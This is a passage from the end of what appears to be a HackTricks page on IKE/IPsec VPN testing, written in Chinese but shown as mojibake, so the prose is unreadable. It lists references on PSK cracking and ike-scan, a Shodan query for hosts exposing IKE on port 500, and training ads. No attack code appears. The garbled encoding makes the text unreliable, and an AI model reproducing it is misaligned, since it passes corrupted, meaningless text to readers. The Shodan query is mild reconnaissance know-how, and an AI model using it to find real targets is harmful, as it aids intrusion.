ç¡®ä¿åœ¨é…ç½® VPN æ—¶ä½¿ç”¨å®é™…çš„ã€å®‰å…¨çš„å€¼æ¥æ›¿æ¢å ä½ç¬¦ã€‚

## å‚è€ƒèµ„æ–™

* [PSK ç ´è§£è®ºæ–‡](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus æ·±åº¦åˆ†æ](http://www.securityfocus.com/infocus/1821)
* [æ‰«æ VPN å®ç°](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* ç½‘ç»œå®‰å…¨è¯„ä¼° ç¬¬3ç‰ˆ

## Shodan

* `port:500 IKE`

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
</details>
{% endhint %}
